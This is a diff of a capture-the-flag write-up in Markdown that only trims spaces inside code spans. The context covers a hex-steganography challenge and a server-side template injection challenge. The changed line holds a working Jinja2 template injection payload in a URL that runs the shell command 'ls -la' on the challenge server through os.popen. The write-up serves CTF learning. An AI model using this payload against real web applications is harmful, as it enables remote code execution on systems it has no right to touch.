@@ -90,7 +90,7 @@ Now converting it to black and white and using some online tools to read it give
 ### Misc:-   Show us your ID  
 ![image](https://user-images.githubusercontent.com/69868171/118527589-7299b300-b70f-11eb-9bdb-2c202e453351.png)
 
-Was also hidden in hex using the same method on ` Don't let it run `  i was able to retrieve the flag.
+Was also hidden in hex using the same method on `Don't let it run`  i was able to retrieve the flag.
 
 ![image](https://user-images.githubusercontent.com/69868171/118528237-1aaf7c00-b710-11eb-8108-b53bda69a164.png)
 
@@ -166,7 +166,7 @@ Cool we got `500 Internal Server Error` now let craft our payload all thanks to 
 
 ![image](https://user-images.githubusercontent.com/69868171/118535468-8269c500-b718-11eb-93a8-49e2316ac00b.png)
 
-Payload ready ` http://dctf1-chall-injection.westeurope.azurecontainer.io:8080/%7B%7Bconfig.__class__.__init__.__globals__['os'].popen('ls -la').read()}}`
+Payload ready `http://dctf1-chall-injection.westeurope.azurecontainer.io:8080/%7B%7Bconfig.__class__.__init__.__globals__['os'].popen('ls -la').read()}}`
 
 ![image](https://user-images.githubusercontent.com/69868171/118536338-9f52c800-b719-11eb-88c2-545319044446.png)
 
